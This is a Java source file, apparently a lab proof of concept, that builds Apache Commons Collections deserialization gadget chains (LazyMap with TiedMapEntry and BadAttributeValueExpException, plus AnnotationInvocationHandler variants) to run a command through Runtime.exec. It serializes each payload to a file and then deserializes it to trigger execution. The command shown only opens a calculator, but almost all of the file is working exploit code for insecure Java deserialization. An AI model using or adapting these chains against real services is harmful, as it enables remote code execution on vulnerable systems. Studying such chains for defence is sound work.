import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;


public class Main {
    public static Transformer transformedChain;
    public static String fileName = "/home/test/unserialize/test.ser";

    public static void main(String[] args) throws Exception {
        transformedChain = generate_chain();
        //transformedChain.transform(null);

        bad_serialize();
        //lazy_serialize();
        //transformed_serialize();
        unserialize();

    }

    public static void test() throws Exception {
        Object object = Runtime.getRuntime();
        Class cls = object.getClass();
        Method method = cls.getMethod("exec", String.class);
        method.invoke(object, "gnome-calculator");
        //Runtime.class.getMethod("getRuntime", null).invoke(null, null).getClass().getMethod("exec", String.class).invoke(null, "gedit");
    }

    public static Transformer generate_chain() {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"gnome-calculator"})
        };
        Transformer transformedChain = new ChainedTransformer(transformers);


        return transformedChain;
    }

    public static void bad_serialize() throws Exception {
        Map normalMap = new HashMap();
        Map lazyMap = LazyMap.decorate(normalMap, transformedChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        serialize_write_file(val);
    }

    public static void lazy_serialize() throws Exception {
        Map normalMap = new HashMap();
        Map lazyMap = LazyMap.decorate(normalMap, transformedChain);

        //lazyMap.get("key");

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);

        InvocationHandler invo = (InvocationHandler) ctor.newInstance(Retention.class, lazyMap);

        Map mapProxy = Map.class.cast(Proxy.newProxyInstance(invo.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invo));
        //mapProxy.entrySet();

        Object instance = ctor.newInstance(Retention.class, mapProxy);

        serialize_write_file(instance);
    }

    public static void transformed_serialize() throws Exception {

        Map normalMap = new HashMap();
        normalMap.put("key", "value");

        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);

        /*
        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();
        entry.setValue("test");
        */

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, transformedMap);

        serialize_write_file(instance);
    }

    public static void serialize_write_file(Object instance) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void unserialize() throws Exception {
        //File f = new File("/home/test/unserialize/test.ser");
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));
        in.readObject();
        in.close();
    }
}
